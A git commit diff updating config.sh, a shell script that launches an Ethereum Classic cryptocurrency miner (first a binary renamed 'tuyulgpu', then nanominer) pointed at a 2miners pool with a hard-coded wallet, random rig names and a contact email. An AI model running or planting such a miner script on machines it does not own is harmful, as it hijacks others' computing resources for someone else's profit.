12e63c1da232cb6202d490b28198217a2e616baa
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-10-20 00:00:50 +0700

    Update config.sh

--- config.sh
+++ config.sh
@@ -1,6 +1,9 @@
 #!/bin/bash
-POOL=etc.2miners.com:1010
-WALLET=0x11880b1cfe04907c5306222be1e09f4bbb480eb5
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-no1)
-chmod +x tuyulgpu
-./tuyulgpu --algo ETCHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+echo "[Etchash]
+wallet = 0x11880b1cfe04907c5306222be1e09f4bbb480eb5
+coin = ETC
+rigName = $(echo $(shuf -i 1-9999 -n 1)-no1)
+email = xmr75609@gmail.com
+rigPassword = x
+pool1 = etc.2miners.com:1010" > config.ini
+./nanominer
